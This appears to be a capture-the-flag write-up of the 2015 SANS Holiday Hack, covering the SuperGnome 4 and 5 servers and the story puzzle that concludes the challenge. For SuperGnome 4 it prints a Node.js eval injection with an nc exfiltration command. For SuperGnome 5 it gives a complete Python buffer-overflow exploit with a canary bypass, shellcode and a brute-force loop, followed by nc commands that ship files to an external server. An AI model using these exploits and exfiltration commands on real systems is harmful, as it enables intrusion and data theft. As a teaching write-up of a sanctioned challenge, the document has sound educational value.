Awesome! Another web challenge. Same schpeal.. same credentials to login. We are given some new functionality in the `/files` tab.

![sg-04](/assets/images/holidayhack2015/sg04_1.png)

Let's upload a random file and capture the request in Burp Suite.

![sg-04](/assets/images/holidayhack2015/sg04_2.png)

Hmm.. we have to upload `.png` files.. Let's check the source to see how exactly they are verifying filetype.

```js
// FILES UPLOAD
router.post('/files', upload.single('file'), function(req, res, next) {
  if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // NEDFORD: this should be 99 not 100 so admins can upload
    var msgs = [];
    file = req.file.buffer;
    if (req.file.mimetype === 'image/png') {  <-- The actual `png` check
      msgs.push('Upload successful.');
      var postproc_syntax = req.body.postproc;
      console.log("File upload syntax:" + postproc_syntax);
      if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
        msgs.push('Executing post process...');
        var result;
        d.run(function() {
          result = eval('(' + postproc_syntax + ')');
        });
        // STUART: (WIP) working to improve image uploads to do some post processing.
        msgs.push('Post process result: ' + result);
      }
      msgs.push('File pending super-admin approval.');
      res.msgs = msgs;
    } else {
      msgs.push('File not one of the approved formats: .png');
      res.msgs = msgs;
    }
  } else
    res.render('index', { title: 'GIYH::ADMIN PORT V.01', session: sessions[sessionid], res: res });
  next();
});
```

We see that the check is simply verifying that the `mimetype` is `image/png`. As it turns out, we control this field in the request. Let's make sure that our hypothesis is true.

![sg-04](/assets/images/holidayhack2015/sg04_3.png)

Boom! So we can upload random files as a `.png`. Looking further in the source code we see something that is most likely vulnerable.

```js
var postproc_syntax = req.body.postproc;
if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
    var result;
    d.run(function() {
        result = eval('(' + postproc_syntax + ')');
    });
}
```

Silly developers! They are passing content directly from the web request to `eval`. This can only mean one thing.. `Remote Code Execution`. To verify, let's simply try to drop our own content into the response by issuing a simple `res.write("You got pwned")`.

![sg-04](/assets/images/holidayhack2015/sg04_4.png)

([For more information on this attack vector](http://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html))

Now that we know that we can execute code on the server, let's attempt to exfiltrate our files off of SuperGnome 4.

We can go out on a limb and use a very simple `netcat` exfiltration technique to an AWS instance in order to grab the files off the SG4.

For the Node.js side, let's execute a command:

```js
require('child_process').exec('nc SERVER_IP PORT < /gnome/www/files/factory_cam_4.zip')
```

This will connect to our `SERVER_IP` and listening `PORT` and will funnel the precious bits in `factory_cam_4.zip` to us.

On our `SERVER`, we simply start a listening port:

```
nc -l 61000 > factory_cam_4.zip
```

We then throw the files from SuperGnome 4 to our server via the `child_process` exec cradle above:

![sg-04](/assets/images/holidayhack2015/sg04_5.png)

Ba-da-bing-ba-da-boom! And now the server kindly ships the `factory_cam_4.zip` file to us. How nice of them..

We can repeat this process with `20151203133815.zip` and `gnome.conf`. We finally extract the files as commonly used in the previous three SuperGnomes.

The email found in the `.pcap`:

```
From: "c" <c@atnascorp.com>
To: <psychdoctor@whovillepsychiatrists.com>
Subject: Answer To Your Question
Date: Thu, 3 Dec 2015 13:38:15 -0500

Dr. O'Malley,

In your recent email, you inquired:

When did you first notice your anxiety about the holiday season?

Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

Before I get into details, please allow me to remind you that we operate
under the strictest doctor-patient confidentiality agreement in the
business.  I have some very powerful lawyers whom I'd hate
to invoke in the event of some leak on your part.  
I seek your help because you are the best psychiatrist in all of Who-ville.

To answer your question directly, as a young child (I must have been no more
than two), I experienced a life-changing interaction.  Very late on
Christmas Eve, I was awakened to find a grotesque green Who dressed in a
tattered Santa Claus outfit, standing in my barren living room, attempting
to shove our holiday tree up the chimney.  My senses heightened, I put on my
best little-girl innocent voice and asked him what he was doing.  He
explained that he was "Santy Claus" and needed to send the tree for repair.
I instantly knew it was a lie, but I humored the old thief so I could escape
to the safety of my bed.  That horrifying interaction ruined Christmas for
me that year, and I was terrified of the whole holiday season throughout my
teen years.

I later learned that the green Who was known as "the Grinch" and had lost
his mind in the middle of a crime spree to steal Christmas presents.  At the
very moment of his criminal triumph, he had a pitiful change of heart and
started playing all nicey-nice.  What an amateur!  When I became an adult,
my fear of Christmas boiled into true hatred of the whole holiday season.  I
knew that I had to stop Christmas from coming.  But how?

I vowed to finish what the Grinch had started, but to do it at
a far larger scale.  Using the latest technology and a distributed channel 
of burglars, we'd rob 2 million houses, grabbing their most precious gifts, 
and selling them on the open market.  We'll destroy Christmas as two million 
homes full of people all cry "BOO-HOO", and we'll turn a handy profit on the whole
deal.

Is this "wrong"?  I simply don't care.  I bear the bitter scars of the Grinch's 
malfeasance, and singing a little "Fahoo Fores" isn't gonna fix that!

What is your advice, doctor?

Signed,

Cindy Lou Who
```

The `factory_cam_4.png` image:

![sg-04](/assets/images/holidayhack2015/factory_cam_4.png)

And finally, the `gnome.conf`:

```
Gnome Serial Number: BU22_1729_2716057
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-04
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

It also looks like we have some Futurama fans, as per the serial number:

![bender](/assets/images/holidayhack2015/bender.jpg)

We..are..so..close! Four down, one to go!

## SuperGnome 5 - Pwnable!

Phew! Home stretch. Stay with me for just a bit longer.

We begin by performing an nmap scan on the host to see which ports are alive.

```
nmap -p- -oA portscan -T4 54.233.105.81
```

```
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
80/tcp   open   http
4242/tcp open   vrml-multi-use
```

OooOoo.. What is this? A new open port! Could this mean we have finally reached a pwnable?

```
$ nc 54.233.105.81 4242
```

```
Welcome to the SuperGnome Server Status Center!
Please enter one of the following options:

1 - Analyze hard disk usage
2 - List open TCP sockets
3 - Check logged in users
```

Ah nice! These strings look like they match some of the code found in the `sgnet.zip` that we picked up on SuperGnome 1. Let's take a closer look at `sgstatd.c`.

```c
recv(sd, &choice, 1, 0);

switch (choice) {
case 49:
    fp = popen("/bin/df", "r");
    while (fgets(path, sizeof(path), fp) != NULL) {
        sgnet_writes(sd, path);
    }
    break;

case 50:
    fp = popen("/bin/netstat -tan", "r");
    while (fgets(path, sizeof(path) - 1, fp) != NULL) {
        sgnet_writes(sd, path);
    }
    break;

case 51:
    fp = popen("/usr/bin/who", "r");
    while (fgets(path, sizeof(path) - 1, fp) != NULL) {
        sgnet_writes(sd, path);
    }
    break;

case 88:
    write(sd, "\n\nH", 4);
    usleep(60000);
    write(sd, "i", 1);
    usleep(60000);
    ...
    sgstatd();
```

Interesting.. We send a one character and it is fed into the switch statement. The statement looks like a normal switch statement for each of the items in the given menu, but wait.. There are 4 cases with only 3 menu options. The case 88 (character `X`) is the odd ball here. It looks like it is also calling `sgstatd()`. That function is shown below.

```c
int sgstatd(sd)
{
    __asm__("movl $0xe4ffffe4, -4(%ebp)");
    //Canary pushed

    char bin[100];
    write(sd, "\nThis function is protected!\n", 30);
    fflush(stdin);
    //recv(sd, &bin, 200, 0);
    sgnet_readn(sd, &bin, 200);
    __asm__("movl -4(%ebp), %edx\n\t" "xor $0xe4ffffe4, %edx\n\t"    // Canary checked
        "jne sgnet_exit");
    return 0;

}
```

Well, ATNAS Corp was definitely generous in giving us commented code. This function does 2 things:

* Creates and checks a static stack canary to block a potential buffer overflow.
* Contains a buffer overflow condition of reading 200 bytes (`sgnet_readn(sd, &bin, 200)`) into a 100 byte buffer (`char bin[100]`).

This looks to be a classic buffer overflow. However, the stack canary is in the way. We can't simply throw a large chunk of data at the buffer and crash EIP. Instead, we have to carefully position the stack canary in our buffer as if it was already there.

Quick diagram to explain what will be happening:

This would be a normal stack overflow.

```
Before             After
+----------------+ +----------------+
|      EIP       | |    AAAAAAAA    |
+----------------+ +----------------+
|    Saved EBP   | |    AAAAAAAA    |
+----------------+ +----------------+
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|     Buffer     | |    AAAAAAAA    |
+----------------+ +----------------+
```

The problem occurs when we introduce the stack canary. The idea behind the stack canary is to put a known value before the `Saved EBP and EIP`. This value is checked before the function returns. If the value has changed, then we know that an overflow has occured and we exit. 

Since this stack canary value is a static value (`__asm__("movl $0xe4ffffe4, -4(%ebp)");`), we simply have to put `0xe4ffffe4` in the correct position in our payload to bypass this check.

```
Before             After
+----------------+ +----------------+
|      EIP       | |    AAAAAAAA    |
+----------------+ +----------------+
|    Saved EBP   | |    AAAAAAAA    |
+----------------+ +----------------+
|   0xe4ffffe4   | |    AAAAAAAA    | <--- Not original stack canary, so we exit ;-(
+----------------+ +----------------+
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|     Buffer     | |    AAAAAAAA    |
+----------------+ +----------------+
```
Inject proper canary.

```
Before             After
+----------------+ +----------------+
|      EIP       | |    AAAAAAAA    |
+----------------+ +----------------+
|    Saved EBP   | |    AAAAAAAA    |
+----------------+ +----------------+
|   0xe4ffffe4   | |   0xe4ffffe4   | <--- Success ;-)
+----------------+ +----------------+
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|                | |    AAAAAAAA    |
|     Buffer     | |    AAAAAAAA    |
+----------------+ +----------------+
```

The challenge now is to determine exactly where in our input buffer the stack canary resides. Since our destination buffer (`buf[100]`) is 100 bytes long, we expect the stack canary to be exactly after that. We can solidify this hypothesis by taking a quick peak in gdb. Note: We will be using [pwndbg](http://github.com/zachriggle/pwndbg) to help ease our way through gdb. But first, we need to find the binary in the firmware image.

As it turns out, if we search for `sgstatd` in the firmware image, we are given the `sgstatd` binary.

```
$ find . -name *sgstatd*
./etc/init.d/sgstatd
./etc/monit.d/sgstatd
./etc/rc.d/Ksgstatd
./etc/rc.d/S98sgstatd
./usr/bin/sgstatd   <-- Our wanted binary
./var/run/sgstatd
```

As with any binary challenge, let's pass it through `file` and [checksec](https://github.com/slimm609/checksec.sh) to get a feeling for what we are dealing with.

```
$ file usr/bin/sgstatd
usr/bin/sgstatd: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=72df753907e54335d83b9e1c3ab00ae402ad812f, not stripped
```

Ok, basic 32bit ELF. Not bad.

```
$ checksec usr/bin/sgstatd
[*] '/home/vagrant/host-share/holidayhack/_firmware.bin.extracted/squashfs-root/usr/bin/sgstatd'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
``` 

Aaand, no NX bit, meaning we can execute code on the stack. Fantastic! This means we can simply overflow the buffer and jump to the stack for command execution.

Before we dive into GDB, let's have a game plan on what we think will work for this exploit.

* Enter `X` into the menu to drop into the hidden command mode
* Enter a `200` length character string containing the specially positioned stack canary and our shellcode
* Overwrite EIP with a `jmp esp` (or equivalent) instruction to redirect execution to the stack where our shellcode is ran

From this point on, we can use [EpicTreasure](https://github.com/thebarbershopper/epictreasure), a Vagrant VM that comes prepackaged with all the tools necessary for most CTF RE and exploit challenges.

Let's see what happens when we run the binary.

```
$ ./usr/bin/sgstatd
Server started...
```

Ah, maybe it has opened a socket for us. `netstat` will tell us that, no problem.

```
$ sudo netstat -antop | grep sgstat
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      31316/sgstatd    off (0.00/0/0)
```

Cool, so it is listening on the same port that the server is listening on. Great!

We begin scripting this exploit with our traditional exploit stub leveraging [binjitsu](https://github.com/binjitsu/binjitsu).

```python
from pwn import *

r = remote('localhost', 4242)

r.interactive() 
```

This will allow us to interact with the binary via Python. We now need to test our hypothesis that we can overflow the buffer after giving the backdoor `X` command.

Assuming we can overflow the buffer, we need to know exactly where in the buffer the stack canary is checked. We will set a breakpoint in `gdb` where the stack canary is checked. A quick run with [radare](https://github.com/radare/radare2) can easily find this instruction. We know it is in the `sgstatd` function.

<script type="text/javascript" src="https://asciinema.org/a/4grarnzgwuksndw1vl6535ftd.js" id="asciicast-4grarnzgwuksndw1vl6535ftd" async></script>

Now that we know that `0x80493b2` is the address of the `xor`, we will send a `cyclic` string from `binjitsu` to the binary and see where in the `cyclic` string the stack canary is checked.

Example cyclic string usage:

```python
In [5]: cyclic(40)
Out[5]: 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'

In [6]: cyclic_find('faaa')
Out[6]: 20
```

If we know the binary crashes at offset `faaa` in our `cyclic` string, then we can quickly know that `20` bytes into the string is the exact location of the crash.

Our current script is below.

```python
from pwn import *

r = remote('localhost', 4242)

# Activate the backdoor
r.sendline('X')

# Send our cyclic payload - 200 bytes we see from source
r.sendline(cyclic(200))

r.interactive() 
```

We will throw this script at the running binary under `gdb`.

<script type="text/javascript" src="https://asciinema.org/a/03icgugke7qkq8s3ockifmznx.js" id="asciicast-03icgugke7qkq8s3ockifmznx" async></script>


Awesome! We know the stack canary must be at `bbaa` offset in our `cyclic` string. Updating the script..


```python
from pwn import *

# Pack 32 bit integer using binjitsu
canary = p32(0xe4ffffe4)

r = remote('localhost', 4242)

# Activate the backdoor
r.sendline('X')

# Send our cyclic payload - 200 bytes we see from source
payload = ''
payload += 'A' * cyclic_find('bbaa')
payload += canary
payload += cyclic(200 - len(payload))

r.sendline(payload)

r.interactive() 
```

We are now past the stack canary check. Let's use the same technique to figure out where in the next `cyclic` string we overwrite EIP.

<script type="text/javascript" src="https://asciinema.org/a/ax552duas9rvcbo05tk5671qp.js" id="asciicast-ax552duas9rvcbo05tk5671qp" async></script>

Knowing that EIP control is at offset `baaa`, we can update our script to have EIP control.


```python
from pwn import *

# Pack 32 bit integer using binjitsu
canary = p32(0xe4ffffe4)

r = remote('localhost', 4242)

# Activate the backdoor
r.sendline('X')

# Send our cyclic payload - 200 bytes we see from source
payload = ''
payload += 'A' * cyclic_find('bbaa')
payload += canary
payload += 'B' * cyclic_find('baaa')
payload += EIP
payload += (200 - len(payload))

r.sendline(payload)

r.interactive() 
```

We know that NX is disabled, so we can simply jump to our buffer on the stack, assuming our buffer contains valid x86 instructions.

One common trick to do this is to point our controlled EIP at a `jmp esp`. This will jump right to our payload on the stack. Radare is fantastic for finding this gadget.

<script type="text/javascript" src="https://asciinema.org/a/9bbyzth64tqpsaqgmb9yq5pfl.js" id="asciicast-9bbyzth64tqpsaqgmb9yq5pfl" async></script>

We will fill in our EIP in our script with this newly found `jmp esp` address.

```python
from pwn import *

# Pack 32 bit integer using binjitsu
canary = p32(0xe4ffffe4)
jmpesp = p32(0x0804936b)

r = remote('localhost', 4242)

# Activate the backdoor
r.sendline('X')

# Send our cyclic payload - 200 bytes we see from source
payload = ''
payload += 'A' * cyclic_find('bbaa')
payload += canary
payload += 'B' * cyclic_find('baaa')
payload += jmpesp
payload += (200 - len(payload))

r.sendline(payload)

r.interactive() 
```

From here, it should be an easy task of using binjitsu to give us a shell via `asm(shellcraft.sh())`, which generates simple `/bin/sh` shellcode.

```python
In [2]: print shellcraft.sh()
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f

    /* call execve('esp', 0, 0) */
    push (SYS_execve) /* 0xb */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
```

Let's see our final shell in action!

```python
from pwn import *

# Pack 32 bit integer using binjitsu
canary = p32(0xe4ffffe4)
jmpesp = p32(0x0804936b)

r = remote('localhost', 4242)

# Activate the backdoor
r.sendline('X')

# Send our cyclic payload - 200 bytes we see from source
payload = ''
payload += 'A' * cyclic_find('bbaa')
payload += canary
payload += 'B' * cyclic_find('baaa')
payload += jmpesp
payload += asm(shellcraft.sh()) # Basic /bin/sh shellcode
payload += (200 - len(payload))

r.sendline(payload)

r.interactive() 
```

<script type="text/javascript" src="https://asciinema.org/a/8tyscgwdrh6z4sxp1ul12aig9.js" id="asciicast-8tyscgwdrh6z4sxp1ul12aig9" async></script>

Wait.. So we are executing a shell, but the shell is opening on the server side? Interesting.. There must be some weird socket file descriptor magic going on. Let's take a look at the source again for some non-standard socket manipulation.

```c
/*
 * Randomizes a given file descriptor.
 * Returns the newly randomized file descriptor.
 * Can never fail (falls back to rand() or the original file descriptor).
 */
int sgnet_randfd(int old)
{
    int max = getdtablesize();  // stay within operating system limits
    int fd = open("/dev/urandom", O_RDONLY);
    int new = 0;

    // randomize new file descriptor
    if (fd < 0) {
        while (new < old) {
            new = rand() % max; // fall back to rand() if fd was invalid
        }
    } else {
        while (new < old) {
            read(fd, &new, 2);
            new %= max;
        }
        close(fd);
    }

    // duplicate the old file descriptor to the new one
    if (dup2(old, new) == -1) {
        new = old;  // if we failed, fall back to using the un-randomized fd
    } else {
        close(old); // if we were successful, close the old fd
    }

    return new;
}
```

True to our hypothesis, it looks like that our socket is being randomzied. It looks like that if we can open `/dev/urandom`, then we read 2 bytes from `urandom` and then `mod` that value by `0x400` (at least getdtablesize() returned `0x400` on my system). If we can't open `/dev/urandom`, then we simply call `rand()` and `mod` that value by `0x400`.

What is even more interesting, is that `srand` is seeded with `time(0)`. This means that if we fail to open `/dev/urandom`, then we can predict what the outcome of the function since `rand()` would be called. We can call `rand()` ourselves locally and generate the file descriptor ourselves.

Or... We could simply know that some random number between `0` and `0x400` (1024) is returned, and can simply repeatedly try the exploit until we randomly choose the right file descriptor.

Being that we will be needing to `dup` our socket for the shellcode, let's utilize the `shellcraft.dupsh()` payload from `binjitsu`.

```
In [6]: print shellcraft.dupsh(88)
dup_5:
    push 0x58
    pop ebx
    push 3
    pop ecx
loop_6:
    dec ecx

    /* call dup2('ebx', 'ecx') */
    push (SYS_dup2) /* 0x3f */
    pop eax
    int 0x80
    jnz loop_6

    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f

    /* call execve('esp', 0, 0) */
    push (SYS_execve) /* 0xb */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
```

Here, we are calling `dup2()` with our designated file descriptor, in this case `88`. From here, we perform our normal `shellcraft.sh()`. In this way, we simply have to throw the exploit until `88` is our file descriptor and we have execution!

There is one last, small problem that we haven't dealt with yet: `alarm`.

```
sgnet.c-#ifndef _DEBUG
sgnet.c-            sgnet_privdrop(user);
sgnet.c:            alarm(16);
sgnet.c-#endif
sgnet.c-            close(sd);
```

The alarm is set to 16 seconds, which isn't really enough time for interactivity. For this reason, we shouldn't rely on interactivity on the box, and instead simply execute individual commands.

Phew.. now that we have the theory down, let's construct this bad boy and grab those files!

We first need to determine how we can exfiltrate files. Two common methods are using `netcat` and `python`. We can check if either is on the box by performing `which nc` and `which python`. Let's modify our script for this task.

```python
from pwn import *

# Pack 32 bit integer using binjitsu
canary = p32(0xe4ffffe4)
jmpesp = p32(0x0804936b)

command = 'whoami;ls;pwd;which nc;which python;iptables -L'

r = remote('localhost', 4242)

while True:
    r.close()
    r = remote('localhost', 4242)
    # Activate the backdoor
    r.sendline('X')

    # Send our cyclic payload - 200 bytes we see from source
    payload = ''
    payload += 'A' * cyclic_find('bbaa')
    payload += canary
    payload += 'B' * cyclic_find('baaa')
    payload += jmpesp
    payload += asm(shellcraft.dupsh(88)) # Basic /bin/sh shellcode
    payload += (200 - len(payload))

    # Send the payload
    r.sendline(payload)

    # Send our wanted commands 
    r.sendline(command)

    out = r.recv()

    # out == '\x00' in the case that the exploit failed, so we avoid that case
    if out != '\x00':
        print out
```

Because we are attempting to get around the random file descriptor, we simply repeat trying to exploit the machine until luck is in our favor.

<script type="text/javascript" src="https://asciinema.org/a/afpozfc3fdkr6il2xk51yy163.js" id="asciicast-afpozfc3fdkr6il2xk51yy163" async></script>

We do see that we have `nc` and `python` on the box! Score! We only need one, so let's exfiltrate via `nc`.

We know the wanted files are in `/gnome/www/files`. We can exfiltrate the files via a simple `nc` command: `nc REMOTE_HOST REMOTE_PORT < /gnome/www/files/FILE`. This will ship the contents of a file to a remote host. In our case, we will simply use an AWS instance as an easy way of exfiltrating files.

After constructing a list of files we want to exfil, we can create a series of `nc` commands with a simple Python loop.

```python
folder = os.path.join('/', 'gnome', 'www', 'files')
files = [
        '20151215161015.zip',
        'factory_cam_5.zip',
        'gnome.conf'
        ]

server_ip = 'your_server_ip'

# Exfiltrate files out of the box
command = ''
for index, file in enumerate(files):
    filepath = os.path.join(folder, file)
    curr_command = 'nc {} 5711{} < {};'.format(server_ip, index, filepath)
    command += curr_command
```

The only thing left to do is setup our listening ports. On our AWS instance, we create a series of listening netcats: `nc -l 57110 > file1`, `nc -l 57111 > file2`, ect.

We throw our exploit and after a few minutes, we are greeted with our prized bounty!

Below is the email from the pcap found in `20151215161015.zip`:

```
From: "Grinch" <grinch@who-villeisp.com>
To: <c@atnascorp.com>
Subject: My Apologies & Holiday Greetings
Date: Tue, 15 Dec 2015 16:09:40 -0500

Dear Cindy Lou,

I am writing to apologize for what I did to you so long ago.  I wronged you
and all the Whos down in Who-ville due to my extreme misunderstanding of
Christmas and a deep-seated hatred.  I should have never lied to you, and I
should have never stolen those gifts on Christmas Eve.  I realize that even
returning them on Christmas morn didn't erase my crimes completely.  I seek
your forgiveness.

You see, on Mount Crumpit that fateful Christmas morning, I learned th
[4 bytes missing in capture file] at Christmas doesn't come from a store.  
In fact, I discovered that Christmas means a whole lot more!

When I returned their gifts, the Whos embraced me.  They forgave.  I was
stunned, and my heart grew even more.  Why, they even let me carve the roast
beast!  They demonstrated to me that the holiday season is, in part, about
forgiveness and love, and that's the gift that all the Whos gave to me that
morning so long ago.  I honestly tear up thinking about it.

I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
most sincere apologies.

And, above all, don't let my horrible actions from so long ago taint you in
any way.  I understand you've grown into an amazing business leader.  You
are a precious and beautiful Who, my dear.  Please use your skills wisely
and to help and support your fellow Who, especially during the holidays.

I sincerely wish you a holiday season full of kindness and warmth,

--The Grinch
```

The `factory_cam_5.png` image:

![sg-05](/assets/images/holidayhack2015/factory_cam_5.png)

And the contents of `gnome.conf`:

```
Gnome Serial Number: 4CKL3R43V4
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-05
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

## Part 5 - Baby, It’s Gnome Outside 

```
9) Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?

10) Who is the villain behind the nefarious plot.
```

(Side note: If you have made it this far, I appreciate you reading this. I love doing these writeups and I hope that you have at least learned something during our time together.)

Wow.. We made it to the end! We found all 5 Super Gnomes and successfully exfiltrated the target files off of the devices! 

There is still one bit of information that we haven't quite figured out yet: What the heck is in the `camera_feed_overlap_error.png` that we found on SuperGnome 1?

Now that we have all 5 camera feed images, let's take the advice of the Message log and `xor` all the image pixels together.

This is a sound task for the [Pillow](http://python-pillow.github.io/) library.

The general attack for this problem is below:

* Convert all of the `.png` images to `Image` objects via `Pillow`
* Extract all of the pixels from each image
* For each pixel, `xor` the Red, Green, and Blue pigments from the six images
* Save these new Red, Green, and Blue pigments to a final image.

Here we go! Let's start by converting all of the images to `Image` objects.

```python
from PIL import Image

filenames = ['camera_feed.png']
for x in xrange(1, 6):
    filenames.append('factory_cam_{}.png'.format(x))

images = []
for filename in filenames:
    curr_image = Image.open(filename).convert('RGB')
    images.append(curr_image)
```

We begin by creating a list of filenames since all of the file names are extremely similar. The resulting list of filenames is then converted to an `RGB` image via the `Image.open(filename).convert('RGB')` function from `Pillow`.

We then create a blank image to write our resulting pixels.

```python
new_image = Image.new('RGB', (1024, 768))
```

Now that we have a list of `Image` objects and our final blank image, we can proceed to extract the pixels from each image and `xor` all of the pixels from all of the images together.

```python

for x in xrange(1024):
    for y in xrange(768):
        # Reset current pixel
        r, g, b = None, None, None

        for curr_image in images:
            red, green, blue = curr_image.getpixel((x, y))
            if not r:
                r, g, b = red, green, blue
            else:
                r ^= red
                g ^= green
                b ^= blue

        new_image.putpixel((x, y), (r, g, b))
```

Each image pixel is extracted via `red, green, blue = curr_image.getpixel((x, y))`. If this is the first image, then we don't worry about the `xor` and simply set our `r`, `g`, and `b` variables to the first image's pixel. If it isn't the first image, then we xor the current pixel with the calculated pixels. This process is repeated for each image for each pixel. Once a pixel is finished being calculated, the resulting value is saved in the final image via `new_image.putpixel((x, y), (r, g, b))`.

We finally write this image to a file:

```python
new_image.save('xored.png')
```

And we are given the actual camera feed image:

![final](/assets/images/holidayhack2015/xored.png)

And now for the analysis (and answers to questions 9 and 10).

The villian in this story is Cindy Lou Who.

Cindy Lou Who was just a small girl when she witnessed The Grinch steal from her home. This act stays with her to this day. Along her journey through life, Cindy has grown to hate Christmas and realize that what the Grinch did when she was a young girl could be done much better and on a much larger scale. Cindy would show the rest of the world what it feels like to have precious items stolen out of their own homes.

Cindy's plot is to create a new Christmas toy: Gnome in your Home. This toy would be a modern version of the old Gnome on the Shelf toy. Unbeknownst to the families purchasing the toy, Gnome in your Home comes prepacked with a camera to exfiltrate snapshots of the family's living room! It was genius! The families would move the doll around the house and the Gnome would take snapshots everywhere it went. Cindy would then exfiltrate these images over DNS to main Command and Control servers called SuperGnomes.

The images on the SuperGnomes would be reviewed and Cindy would create lists of items from each house that she views as most profitable. Cindy then enlists a group of burglars, dressed at "Santy Clauses", to steal the items on Cindy's list. These items would then be sold and the profits would be split 50/50 between Cindy and the burglars.

The Grinch tries to reach out to Cindy, apologizing for his horrible actions many moons ago. He hopes that his actions would not taint Cindy in any way.

Luckily, we were warned just in time to thwart Cindy's attempted mass-theft.

And there you have it, folks. Thank you so much for staying with me during this crazy writeup. Definitely a great mix of skills and challenges this year. A huge shoutout to the crew at CounterHack for putting on an amazing set of challenges and interesting story to tie them all together.
